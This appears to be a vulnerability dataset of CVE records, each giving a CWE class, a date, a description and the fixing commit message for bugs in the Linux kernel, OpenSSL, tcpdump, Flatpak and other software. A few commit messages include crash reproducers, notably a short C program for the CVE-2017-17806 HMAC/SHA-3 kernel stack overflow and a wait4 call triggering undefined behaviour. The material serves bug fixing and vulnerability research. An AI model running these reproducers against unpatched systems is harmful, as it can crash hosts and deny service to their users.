CVE-2014-8109,CWE-863,2014-12-29,"mod_lua.c in the mod_lua module in the Apache HTTP Server 2.3.x and 2.4.x through 2.4.10 does not support an httpd configuration in which the same Lua authorization provider is used with different arguments within different contexts, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging multiple Require directives, as demonstrated by a configuration that specifies authorization for one group to access a certain directory, and authorization for a second group to access a second directory.",  *) SECURITY: CVE-2014-8109 (cve.mitre.org)      mod_lua: Fix handling of the Require line when a LuaAuthzProvider is      used in multiple Require directives with different arguments.      PR57204 [Edward Lu <Chaosed0 gmail.com>]  Submitted By: Edward Lu Committed By: covener   Submitted by: covener Reviewed/backported by: jim   git-svn-id: https://svn.apache.org/repos/asf/httpd/httpd/branches/2.4.x@1642861 13f79535-47bb-0310-9956-ffa450edef68
CVE-2016-4353,CWE-20,2016-06-13,"ber-decoder.c in Libksba before 1.3.3 does not properly handle decoder stack overflows, which allows remote attackers to cause a denial of service (abort) via crafted BER data.",
CVE-2016-6561,CWE-476,2017-03-31,illumos smbsrv NULL pointer dereference allows system crash.,
CVE-2019-12589,CWE-732,2019-06-03,"In Firejail before 0.9.60, seccomp filters are writable inside the jail, leading to a lack of intended seccomp restrictions for a process that is joined to the jail after a filter has been modified by an attacker.",avoid creating locations in the file system that are both writable and executable (in this case for processes with euid of the user).  for the same reason also remove user owned libfiles when it is not needed any more
CVE-2019-9213,CWE-476,2019-03-05,"In the Linux kernel before 4.20.14, expand_downwards in mm/mmap.c lacks a check for the mmap minimum address, which makes it easier for attackers to exploit kernel NULL pointer dereferences on non-SMAP platforms. This is related to a capability check for the wrong task.","security_mmap_addr() does a capability check with current_cred(), but we can reach this code from contexts like a VFS write handler where current_cred() must not be used.  This can be abused on systems without SMAP to make NULL pointer dereferences exploitable again.  Fixes: 8869477 (""security: protect from stack expansion into low vm addresses"") Cc: stable@kernel.org Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-17806,CWE-787,2017-12-20,"The HMAC implementation (crypto/hmac.c) in the Linux kernel before 4.14.8 does not validate that the underlying cryptographic hash algorithm is unkeyed, allowing a local attacker able to use the AF_ALG-based hash interface (CONFIG_CRYPTO_USER_API_HASH) and the SHA-3 hash algorithm (CONFIG_CRYPTO_SHA3) to cause a kernel stack buffer overflow by executing a crafted sequence of system calls that encounter a missing SHA-3 initialization.","Because the HMAC template didn't check that its underlying hash algorithm is unkeyed, trying to use ""hmac(hmac(sha3-512-generic))"" through AF_ALG or through KEYCTL_DH_COMPUTE resulted in the inner HMAC being used without having been keyed, resulting in sha3_update() being called without sha3_init(), causing a stack buffer overflow.  This is a very old bug, but it seems to have only started causing real problems when SHA-3 support was added (requires CONFIG_CRYPTO_SHA3) because the innermost hash's state is ->import()ed from a zeroed buffer, and it just so happens that other hash algorithms are fine with that, but SHA-3 is not.  However, there could be arch or hardware-dependent hash algorithms also affected; I couldn't test everything.  Fix the bug by introducing a function crypto_shash_alg_has_setkey() which tests whether a shash algorithm is keyed.  Then update the HMAC template to require that its underlying hash algorithm is unkeyed.  Here is a reproducer:      #include <linux/if_alg.h>     #include <sys/socket.h>      int main()     {         int algfd;         struct sockaddr_alg addr = {             .salg_type = ""hash"",             .salg_name = ""hmac(hmac(sha3-512-generic))"",         };         char key[4096] = { 0 };          algfd = socket(AF_ALG, SOCK_SEQPACKET, 0);         bind(algfd, (const struct sockaddr *)&addr, sizeof(addr));         setsockopt(algfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key));     }  Here was the KASAN report from syzbot:      BUG: KASAN: stack-out-of-bounds in memcpy include/linux/string.h:341  [inline]     BUG: KASAN: stack-out-of-bounds in sha3_update+0xdf/0x2e0  crypto/sha3_generic.c:161     Write of size 4096 at addr ffff8801cca07c40 by task syzkaller076574/3044      CPU: 1 PID: 3044 Comm: syzkaller076574 Not tainted 4.14.0-mm1+ #25     Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS  Google 01/01/2011     Call Trace:       __dump_stack lib/dump_stack.c:17 [inline]       dump_stack+0x194/0x257 lib/dump_stack.c:53       print_address_description+0x73/0x250 mm/kasan/report.c:252       kasan_report_error mm/kasan/report.c:351 [inline]       kasan_report+0x25b/0x340 mm/kasan/report.c:409       check_memory_region_inline mm/kasan/kasan.c:260 [inline]       check_memory_region+0x137/0x190 mm/kasan/kasan.c:267       memcpy+0x37/0x50 mm/kasan/kasan.c:303       memcpy include/linux/string.h:341 [inline]       sha3_update+0xdf/0x2e0 crypto/sha3_generic.c:161       crypto_shash_update+0xcb/0x220 crypto/shash.c:109       shash_finup_unaligned+0x2a/0x60 crypto/shash.c:151       crypto_shash_finup+0xc4/0x120 crypto/shash.c:165       hmac_finup+0x182/0x330 crypto/hmac.c:152       crypto_shash_finup+0xc4/0x120 crypto/shash.c:165       shash_digest_unaligned+0x9e/0xd0 crypto/shash.c:172       crypto_shash_digest+0xc4/0x120 crypto/shash.c:186       hmac_setkey+0x36a/0x690 crypto/hmac.c:66       crypto_shash_setkey+0xad/0x190 crypto/shash.c:64       shash_async_setkey+0x47/0x60 crypto/shash.c:207       crypto_ahash_setkey+0xaf/0x180 crypto/ahash.c:200       hash_setkey+0x40/0x90 crypto/algif_hash.c:446       alg_setkey crypto/af_alg.c:221 [inline]       alg_setsockopt+0x2a1/0x350 crypto/af_alg.c:254       SYSC_setsockopt net/socket.c:1851 [inline]       SyS_setsockopt+0x189/0x360 net/socket.c:1830       entry_SYSCALL_64_fastpath+0x1f/0x96  Reported-by: syzbot <syzkaller@googlegroups.com> Cc: <stable@vger.kernel.org> Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2013-6380,CWE-20,2013-11-27,"The aac_send_raw_srb function in drivers/scsi/aacraid/commctrl.c in the Linux kernel through 3.12.1 does not properly validate a certain size value, which allows local users to cause a denial of service (invalid pointer dereference) or possibly have unspecified other impact via an FSACTL_SEND_RAW_SRB ioctl call that triggers a crafted SRB command.","It appears that driver runs into a problem here if fibsize is too small because we allocate user_srbcmd with fibsize size only but later we access it until user_srbcmd->sg.count to copy it over to srbcmd.  It is not correct to test (fibsize < sizeof(*user_srbcmd)) because this structure already includes one sg element and this is not needed for commands without data.  So, we would recommend to add the following (instead of test for fibsize == 0).  Signed-off-by: Mahesh Rajashekhara <Mahesh.Rajashekhara@pmcs.com> Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2015-5289,CWE-119,2015-10-26,"Multiple stack-based buffer overflows in json parsing in PostgreSQL before 9.3.x before 9.3.10 and 9.4.x before 9.4.5 allow attackers to cause a denial of service (server crash) via unspecified vectors, which are not properly handled in (1) json or (2) jsonb values.",
CVE-2017-10966,CWE-416,2017-07-07,"An issue was discovered in Irssi before 1.0.4. While updating the internal nick list, Irssi could incorrectly use the GHashTable interface and free the nick while updating it. This would then result in use-after-free conditions on each access of the hash table.",Security  Closes #10  See merge request !17
CVE-2016-10147,CWE-476,2017-01-18,"crypto/mcryptd.c in the Linux kernel before 4.8.15 allows local users to cause a denial of service (NULL pointer dereference and system crash) by using an AF_ALG socket with an incompatible algorithm, as demonstrated by mcryptd(md5).","Algorithms not compatible with mcryptd could be spawned by mcryptd with a direct crypto_alloc_tfm invocation using a ""mcryptd(alg)"" name construct.  This causes mcryptd to crash the kernel if an arbitrary ""alg"" is incompatible and not intended to be used with mcryptd.  It is an issue if AF_ALG tries to spawn mcryptd(alg) to expose it externally. But such algorithms must be used internally and not be exposed.  We added a check to enforce that only internal algorithms are allowed with mcryptd at the time mcryptd is spawning an algorithm.  Link: http://marc.info/?l=linux-crypto-vger&m=148063683310477&w=2 Cc: stable@vger.kernel.org Reported-by: Mikulas Patocka <mpatocka@redhat.com> Signed-off-by: Tim Chen <tim.c.chen@linux.intel.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2018-0737,CWE-327,2018-04-16,The OpenSSL RSA Key generation algorithm has been shown to be vulnerable to a cache timing side channel attack. An attacker with sufficient access to mount cache timing attacks during the RSA key generation process could recover the private key. Fixed in OpenSSL 1.1.0i-dev (Affected 1.1.0-1.1.0h). Fixed in OpenSSL 1.0.2p-dev (Affected 1.0.2b-1.0.2o).,
CVE-2018-6560,CWE-436,2018-02-02,"In dbus-proxy/flatpak-proxy.c in Flatpak before 0.8.9, and 0.9.x and 0.10.x before 0.10.3, crafted D-Bus messages to the host can be used to break out of the sandbox, because whitespace handling in the proxy is not identical to whitespace handling in the daemon.","During the authentication all client data is directly forwarded to the dbus daemon as is, until we detect the BEGIN command after which we start filtering the binary dbus protocol.  Unfortunately the detection of the BEGIN command in the proxy did not exactly match the detection in the dbus daemon. A BEGIN followed by a space or tab was considered ok in the daemon but not by the proxy. This could be exploited to send arbitrary dbus messages to the host, which can be used to break out of the sandbox.  This was noticed by Gabriel Campana of The Google Security Team.  This fix makes the detection of the authentication phase end match the dbus code. In addition we duplicate the authentication line validation from dbus, which includes ensuring all data is ASCII, and limiting the size of a line to 16k. In fact, we add some extra stringent checks, disallowing ASCII control chars and requiring that auth lines start with a capital letter."
CVE-2017-5850,CWE-770,2017-03-27,httpd in OpenBSD allows remote attackers to cause a denial of service (memory consumption) via a series of requests for a large file using an HTTP Range header.,The previous implementation loaded all the output into a single output buffer and used its size to determine the Content-Length of the body.  The new implementation calculates the body length first and writes the individual ranges in an async way using the bufferevent mechanism.  This prevents httpd from using too much memory and applies the watermark and throttling mechanisms to range requests.  Problem reported by Pierre Kim (pierre.kim.sec at gmail.com)  OK benno@ sunil@
CVE-2016-10061,CWE-252,2017-03-03,"The ReadGROUP4Image function in coders/tiff.c in ImageMagick before 7.0.1-10 does not check the return value of the fputc function, which allows remote attackers to cause a denial of service (crash) via a crafted image file.",
CVE-2015-8767,CWE-362,2016-02-08,"net/sctp/sm_sideeffect.c in the Linux kernel before 4.3 does not properly manage the relationship between a lock and a socket, which allows local users to cause a denial of service (deadlock) via a crafted sctp_accept call.","A case can occur when sctp_accept() is called by the user during a heartbeat timeout event after the 4-way handshake.  Since sctp_assoc_migrate() changes both assoc->base.sk and assoc->ep, the bh_sock_lock in sctp_generate_heartbeat_event() will be taken with the listening socket but released with the new association socket. The result is a deadlock on any future attempts to take the listening socket lock.  Note that this race can occur with other SCTP timeouts that take the bh_lock_sock() in the event sctp_accept() is called.   BUG: soft lockup - CPU#9 stuck for 67s! [swapper:0]  ...  RIP: 0010:[<ffffffff8152d48e>]  [<ffffffff8152d48e>] _spin_lock+0x1e/0x30  RSP: 0018:ffff880028323b20  EFLAGS: 00000206  RAX: 0000000000000002 RBX: ffff880028323b20 RCX: 0000000000000000  RDX: 0000000000000000 RSI: ffff880028323be0 RDI: ffff8804632c4b48  RBP: ffffffff8100bb93 R08: 0000000000000000 R09: 0000000000000000  R10: ffff880610662280 R11: 0000000000000100 R12: ffff880028323aa0  R13: ffff8804383c3880 R14: ffff880028323a90 R15: ffffffff81534225  FS:  0000000000000000(0000) GS:ffff880028320000(0000) knlGS:0000000000000000  CS:  0010 DS: 0018 ES: 0018 CR0: 000000008005003b  CR2: 00000000006df528 CR3: 0000000001a85000 CR4: 00000000000006e0  DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000  DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400  Process swapper (pid: 0, threadinfo ffff880616b70000, task ffff880616b6cab0)  Stack:  ffff880028323c40 ffffffffa01c2582 ffff880614cfb020 0000000000000000  <d> 0100000000000000 00000014383a6c44 ffff8804383c3880 ffff880614e93c00  <d> ffff880614e93c00 0000000000000000 ffff8804632c4b00 ffff8804383c38b8  Call Trace:  <IRQ>  [<ffffffffa01c2582>] ? sctp_rcv+0x492/0xa10 [sctp]  [<ffffffff8148c559>] ? nf_iterate+0x69/0xb0  [<ffffffff814974a0>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8148c716>] ? nf_hook_slow+0x76/0x120  [<ffffffff814974a0>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8149757d>] ? ip_local_deliver_finish+0xdd/0x2d0  [<ffffffff81497808>] ? ip_local_deliver+0x98/0xa0  [<ffffffff81496ccd>] ? ip_rcv_finish+0x12d/0x440  [<ffffffff81497255>] ? ip_rcv+0x275/0x350  [<ffffffff8145cfeb>] ? __netif_receive_skb+0x4ab/0x750  ...  With lockdep debugging:   =====================================  [ BUG: bad unlock balance detected! ]  -------------------------------------  CslRx/12087 is trying to release lock (slock-AF_INET) at:  [<ffffffffa01bcae0>] sctp_generate_timeout_event+0x40/0xe0 [sctp]  but there are no more locks to release!   other info that might help us debug this:  2 locks held by CslRx/12087:  #0:  (&asoc->timers[i]){+.-...}, at: [<ffffffff8108ce1f>] run_timer_softirq+0x16f/0x3e0  #1:  (slock-AF_INET){+.-...}, at: [<ffffffffa01bcac3>] sctp_generate_timeout_event+0x23/0xe0 [sctp]  Ensure the socket taken is also the same one that is released by saving a copy of the socket before entering the timeout event critical section.  Signed-off-by: Karl Heiss <kheiss@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2014-4014,CWE-264,2014-06-23,"The capabilities implementation in the Linux kernel before 3.14.8 does not properly consider that namespaces are inapplicable to inodes, which allows local users to bypass intended chmod restrictions by first creating a user namespace, as demonstrated by setting the setgid bit on a file with group ownership of root.","The kernel has no concept of capabilities with respect to inodes; inodes exist independently of namespaces.  For example, inode_capable(inode, CAP_LINUX_IMMUTABLE) would be nonsense.  This patch changes inode_capable to check for uid and gid mappings and renames it to capable_wrt_inode_uidgid, which should make it more obvious what it does.  Fixes CVE-2014-4014.  Cc: Theodore Ts'o <tytso@mit.edu> Cc: Serge Hallyn <serge.hallyn@ubuntu.com> Cc: ""Eric W. Biederman"" <ebiederm@xmission.com> Cc: Dave Chinner <david@fromorbit.com> Cc: stable@vger.kernel.org Signed-off-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2015-0286,CWE-17,2015-03-19,"The ASN1_TYPE_cmp function in crypto/asn1/a_type.c in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a does not properly perform boolean-type comparisons, which allows remote attackers to cause a denial of service (invalid read operation and application crash) via a crafted X.509 certificate to an endpoint that uses the certificate-verification feature.",
CVE-2012-1179,CWE-264,2012-05-17,"The Linux kernel before 3.3.1, when KVM is used, allows guest OS users to cause a denial of service (host OS crash) by leveraging administrative access to the guest OS, related to the pmd_none_or_clear_bad function and page faults for huge pages.","commit 1a5a990 upstream.  In some cases it may happen that pmd_none_or_clear_bad() is called with the mmap_sem hold in read mode.  In those cases the huge page faults can allocate hugepmds under pmd_none_or_clear_bad() and that can trigger a false positive from pmd_bad() that will not like to see a pmd materializing as trans huge.  It's not khugepaged causing the problem, khugepaged holds the mmap_sem in write mode (and all those sites must hold the mmap_sem in read mode to prevent pagetables to go away from under them, during code review it seems vm86 mode on 32bit kernels requires that too unless it's restricted to 1 thread per process or UP builds).  The race is only with the huge pagefaults that can convert a pmd_none() into a pmd_trans_huge().  Effectively all these pmd_none_or_clear_bad() sites running with mmap_sem in read mode are somewhat speculative with the page faults, and the result is always undefined when they run simultaneously.  This is probably why it wasn't common to run into this.  For example if the madvise(MADV_DONTNEED) runs zap_page_range() shortly before the page fault, the hugepage will not be zapped, if the page fault runs first it will be zapped.  Altering pmd_bad() not to error out if it finds hugepmds won't be enough to fix this, because zap_pmd_range would then proceed to call zap_pte_range (which would be incorrect if the pmd become a pmd_trans_huge()).  The simplest way to fix this is to read the pmd in the local stack (regardless of what we read, no need of actual CPU barriers, only compiler barrier needed), and be sure it is not changing under the code that computes its value.  Even if the real pmd is changing under the value we hold on the stack, we don't care.  If we actually end up in zap_pte_range it means the pmd was not none already and it was not huge, and it can't become huge from under us (khugepaged locking explained above).  All we need is to enforce that there is no way anymore that in a code path like below, pmd_trans_huge can be false, but pmd_none_or_clear_bad can run into a hugepmd.  The overhead of a barrier() is just a compiler tweak and should not be measurable (I only added it for THP builds).  I don't exclude different compiler versions may have prevented the race too by caching the value of *pmd on the stack (that hasn't been verified, but it wouldn't be impossible considering pmd_none_or_clear_bad, pmd_bad, pmd_trans_huge, pmd_none are all inlines and there's no external function called in between pmd_trans_huge and pmd_none_or_clear_bad).  		if (pmd_trans_huge(*pmd)) { 			if (next-addr != HPAGE_PMD_SIZE) { 				VM_BUG_ON(!rwsem_is_locked(&tlb->mm->mmap_sem)); 				split_huge_page_pmd(vma->vm_mm, pmd); 			} else if (zap_huge_pmd(tlb, vma, pmd, addr)) 				continue; 			/* fall through */ 		} 		if (pmd_none_or_clear_bad(pmd))  Because this race condition could be exercised without special privileges this was reported in CVE-2012-1179.  The race was identified and fully explained by Ulrich who debugged it. I'm quoting his accurate explanation below, for reference.  ====== start quote =======       mapcount 0 page_mapcount 1       kernel BUG at mm/huge_memory.c:1384!      At some point prior to the panic, a ""bad pmd ..."" message similar to the     following is logged on the console:        mm/memory.c:145: bad pmd ffff8800376e1f98(80000000314000e7).      The ""bad pmd ..."" message is logged by pmd_clear_bad() before it clears     the page's PMD table entry.          143 void pmd_clear_bad(pmd_t *pmd)         144 {     ->  145         pmd_ERROR(*pmd);         146         pmd_clear(pmd);         147 }      After the PMD table entry has been cleared, there is an inconsistency     between the actual number of PMD table entries that are mapping the page     and the page's map count (_mapcount field in struct page). When the page     is subsequently reclaimed, __split_huge_page() detects this inconsistency.         1381         if (mapcount != page_mapcount(page))        1382                 printk(KERN_ERR ""mapcount %d page_mapcount %d\n"",        1383                        mapcount, page_mapcount(page));     -> 1384         BUG_ON(mapcount != page_mapcount(page));      The root cause of the problem is a race of two threads in a multithreaded     process. Thread B incurs a page fault on a virtual address that has never     been accessed (PMD entry is zero) while Thread A is executing an madvise()     system call on a virtual address within the same 2 MB (huge page) range.                 virtual address space               .---------------------.               |                     |               |                     |             .-|---------------------|             | |                     |             | |                     |<-- B(fault)             | |                     |       2 MB  | |/////////////////////|-.       huge <  |/////////////////////|  > A(range)       page  | |/////////////////////|-'             | |                     |             | |                     |             '-|---------------------|               |                     |               |                     |               '---------------------'      - Thread A is executing an madvise(..., MADV_DONTNEED) system call       on the virtual address range ""A(range)"" shown in the picture.      sys_madvise       // Acquire the semaphore in shared mode.       down_read(&current->mm->mmap_sem)       ...       madvise_vma         switch (behavior)         case MADV_DONTNEED:              madvise_dontneed                zap_page_range                  unmap_vmas                    unmap_page_range                      zap_pud_range                        zap_pmd_range                          //                          // Assume that this huge page has never been accessed.                          // I.e. content of the PMD entry is zero (not mapped).                          //                          if (pmd_trans_huge(*pmd)) {                              // We don't get here due to the above assumption.                          }                          //                          // Assume that Thread B incurred a page fault and              .---------> // sneaks in here as shown below.              |           //              |           if (pmd_none_or_clear_bad(pmd))              |               {              |                 if (unlikely(pmd_bad(*pmd)))              |                     pmd_clear_bad              |                     {              |                       pmd_ERROR              |                         // Log ""bad pmd ..."" message here.              |                       pmd_clear              |                         // Clear the page's PMD entry.              |                         // Thread B incremented the map count              |                         // in page_add_new_anon_rmap(), but              |                         // now the page is no longer mapped              |                         // by a PMD entry (-> inconsistency).              |                     }              |               }              |              v     - Thread B is handling a page fault on virtual address ""B(fault)"" shown       in the picture.      ...     do_page_fault       __do_page_fault         // Acquire the semaphore in shared mode.         down_read_trylock(&mm->mmap_sem)         ...         handle_mm_fault           if (pmd_none(*pmd) && transparent_hugepage_enabled(vma))               // We get here due to the above assumption (PMD entry is zero).               do_huge_pmd_anonymous_page                 alloc_hugepage_vma                   // Allocate a new transparent huge page here.                 ...                 __do_huge_pmd_anonymous_page                   ...                   spin_lock(&mm->page_table_lock)                   ...                   page_add_new_anon_rmap                     // Here we increment the page's map count (starts at -1).                     atomic_set(&page->_mapcount, 0)                   set_pmd_at                     // Here we set the page's PMD entry which will be cleared                     // when Thread A calls pmd_clear_bad().                   ...                   spin_unlock(&mm->page_table_lock)      The mmap_sem does not prevent the race because both threads are acquiring     it in shared mode (down_read).  Thread B holds the page_table_lock while     the page's map count and PMD table entry are updated.  However, Thread A     does not synchronize on that lock.  ====== end quote =======  [akpm@linux-foundation.org: checkpatch fixes] Reported-by: Ulrich Obergfell <uobergfe@redhat.com> Signed-off-by: Andrea Arcangeli <aarcange@redhat.com> Acked-by: Johannes Weiner <hannes@cmpxchg.org> Cc: Mel Gorman <mgorman@suse.de> Cc: Hugh Dickins <hughd@google.com> Cc: Dave Jones <davej@redhat.com> Acked-by: Larry Woodman <lwoodman@redhat.com> Acked-by: Rik van Riel <riel@redhat.com> Cc: Mark Salter <msalter@redhat.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2013-2017,CWE-399,2013-05-03,"The veth (aka virtual Ethernet) driver in the Linux kernel before 2.6.34 does not properly manage skbs during congestion, which allows remote attackers to cause a denial of service (system crash) by leveraging lack of skb consumption in conjunction with a double-free error.","In case of congestion, netif_rx() frees the skb, so we must assume dev_forward_skb() also consume skb.  Bug introduced by commit 4454096 (veth: move loopback logic to common location)  We must change dev_forward_skb() to always consume skb, and veth to not double free it.  Bug report : http://marc.info/?l=linux-netdev&m=127310770900442&w=3  Reported-by: Martín Ferrari <martin.ferrari@gmail.com> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-5366,CWE-399,2015-08-31,"The (1) udp_recvmsg and (2) udpv6_recvmsg functions in the Linux kernel before 4.0.6 provide inappropriate -EAGAIN return values, which allows remote attackers to cause a denial of service (EPOLLET epoll application read outage) via an incorrect checksum in a UDP packet, a different vulnerability than CVE-2015-5364.","We have two problems in UDP stack related to bogus checksums :  1) We return -EAGAIN to application even if receive queue is not empty.    This breaks applications using edge trigger epoll()  2) Under UDP flood, we can loop forever without yielding to other    processes, potentially hanging the host, especially on non SMP.  This patch is an attempt to make things better.  We might in the future add extra support for rt applications wanting to better control time spent doing a recv() in a hostile environment. For example we could validate checksums before queuing packets in socket receive queue.  Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Willem de Bruijn <willemb@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-14043,CWE-732,2018-07-13,"mstdlib (aka the M Standard Library for C) 1.2.0 has incorrect file access control in situations where M_fs_perms_can_access attempts to delete an existing file (that lacks public read/write access) during a copy operation, related to fs/m_fs.c and fs/m_fs_path.c. An attacker could create the file and then would have access to the data.",
CVE-2018-15911,CWE-908,2018-08-28,"In Artifex Ghostscript 9.23 before 2018-08-24, attackers able to supply crafted PostScript could use uninitialized memory access in the aesdecode operator to crash the interpreter or potentially execute code.",
CVE-2014-4652,CWE-362,2014-07-03,Race condition in the tlv handler functionality in the snd_ctl_elem_user_tlv function in sound/core/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 allows local users to obtain sensitive information from kernel memory by leveraging /dev/snd/controlCX access.,The user-control put and get handlers as well as the tlv do not protect against concurrent access from multiple threads. Since the state of the control is not updated atomically it is possible that either two write operations or a write and a read operation race against each other. Both can lead to arbitrary memory disclosure. This patch introduces a new lock that protects user-controls from concurrent access. Since applications typically access controls sequentially than in parallel a single lock per card should be fine.  Signed-off-by: Lars-Peter Clausen <lars@metafoo.de> Acked-by: Jaroslav Kysela <perex@perex.cz> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>
CVE-2018-14468,CWE-125,2019-10-03,The FRF.16 parser in tcpdump before 4.9.3 has a buffer over-read in print-fr.c:mfr_print().,"The specification says in a well-formed Magic Number information element the data is exactly 4 bytes long. In mfr_print() check this before trying to read those 4 bytes.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2017-13002,CWE-125,2017-09-14,The AODV parser in tcpdump before 4.9.2 has a buffer over-read in print-aodv.c:aodv_extension().,"In aodv_extension() do a bounds check on the extension header before we look at it.  This fixes a buffer over-read discovered by Kamil Frankowicz.  Add a test using the capture file supplied by the reporter(s).  While we're at it, add the RFC number, and check the validity of the length for the Hello extension."
CVE-2017-15951,CWE-20,2017-10-28,"The KEYS subsystem in the Linux kernel before 4.13.10 does not correctly synchronize the actions of updating versus finding a key in the ""negative"" state to avoid a race condition, which allows local users to cause a denial of service or possibly have unspecified other impact via crafted system calls.","Consolidate KEY_FLAG_INSTANTIATED, KEY_FLAG_NEGATIVE and the rejection error into one field such that:   (1) The instantiation state can be modified/read atomically.   (2) The error can be accessed atomically with the state.   (3) The error isn't stored unioned with the payload pointers.  This deals with the problem that the state is spread over three different objects (two bits and a separate variable) and reading or updating them atomically isn't practical, given that not only can uninstantiated keys change into instantiated or rejected keys, but rejected keys can also turn into instantiated keys - and someone accessing the key might not be using any locking.  The main side effect of this problem is that what was held in the payload may change, depending on the state.  For instance, you might observe the key to be in the rejected state.  You then read the cached error, but if the key semaphore wasn't locked, the key might've become instantiated between the two reads - and you might now have something in hand that isn't actually an error code.  The state is now KEY_IS_UNINSTANTIATED, KEY_IS_POSITIVE or a negative error code if the key is negatively instantiated.  The key_is_instantiated() function is replaced with key_is_positive() to avoid confusion as negative keys are also 'instantiated'.  Additionally, barriering is included:   (1) Order payload-set before state-set during instantiation.   (2) Order state-read before payload-read when using the key.  Further separate barriering is necessary if RCU is being used to access the payload content after reading the payload pointers.  Fixes: 146aa8b (""KEYS: Merge the type-specific data with the payload data"") Cc: stable@vger.kernel.org # v4.4+ Reported-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Reviewed-by: Eric Biggers <ebiggers@google.com>"
CVE-2018-5873,CWE-362,2018-07-06,"An issue was discovered in the __ns_get_path function in fs/nsfs.c in the Linux kernel before 4.11. Due to a race condition when accessing files, a Use After Free condition can occur. This also affects all Android releases from CAF using the Linux kernel (Android for MSM, Firefox OS for MSM, QRD Android) before security patch level 2018-07-05.","Andrey reported a use-after-free in __ns_get_path():    spin_lock include/linux/spinlock.h:299 [inline]   lockref_get_not_dead+0x19/0x80 lib/lockref.c:179   __ns_get_path+0x197/0x860 fs/nsfs.c:66   open_related_ns+0xda/0x200 fs/nsfs.c:143   sock_ioctl+0x39d/0x440 net/socket.c:1001   vfs_ioctl fs/ioctl.c:45 [inline]   do_vfs_ioctl+0x1bf/0x1780 fs/ioctl.c:685   SYSC_ioctl fs/ioctl.c:700 [inline]   SyS_ioctl+0x8f/0xc0 fs/ioctl.c:691  We are under rcu read lock protection at that point:          rcu_read_lock();         d = atomic_long_read(&ns->stashed);         if (!d)                 goto slow;         dentry = (struct dentry *)d;         if (!lockref_get_not_dead(&dentry->d_lockref))                 goto slow;         rcu_read_unlock();  but don't use a proper RCU API on the free path, therefore a parallel __d_free() could free it at the same time.  We need to mark the stashed dentry with DCACHE_RCUACCESS so that __d_free() will be called after all readers leave RCU.  Fixes: e149ed2 (""take the targets of /proc/*/ns/* symlinks to separate fs"") Cc: Alexander Viro <viro@zeniv.linux.org.uk> Cc: Andrew Morton <akpm@linux-foundation.org> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2018-10087,CWE-20,2018-04-13,"The kernel_wait4 function in kernel/exit.c in the Linux kernel before 4.13, when an unspecified architecture and compiler is used, might allow local users to cause a denial of service by triggering an attempted use of the -INT_MIN value.","wait4(-2147483648, 0x20, 0, 0xdd0000) triggers: UBSAN: Undefined behaviour in kernel/exit.c:1651:9  The related calltrace is as follows:    negation of -2147483648 cannot be represented in type 'int':   CPU: 9 PID: 16482 Comm: zj Tainted: G    B          ---- -------   3.10.0-327.53.58.71.x86_64+ #66   Hardware name: Huawei Technologies Co., Ltd. Tecal RH2285          /BC11BTSA              , BIOS CTSAV036 04/27/2011   Call Trace:     dump_stack+0x19/0x1b     ubsan_epilogue+0xd/0x50     __ubsan_handle_negate_overflow+0x109/0x14e     SyS_wait4+0x1cb/0x1e0     system_call_fastpath+0x16/0x1b  Exclude the overflow to avoid the UBSAN warning.  Link: http://lkml.kernel.org/r/1497264618-20212-1-git-send-email-zhongjiang@huawei.com Signed-off-by: zhongjiang <zhongjiang@huawei.com> Cc: Oleg Nesterov <oleg@redhat.com> Cc: David Rientjes <rientjes@google.com> Cc: Aneesh Kumar K.V <aneesh.kumar@linux.vnet.ibm.com> Cc: Kirill A. Shutemov <kirill.shutemov@linux.intel.com> Cc: Xishi Qiu <qiuxishi@huawei.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
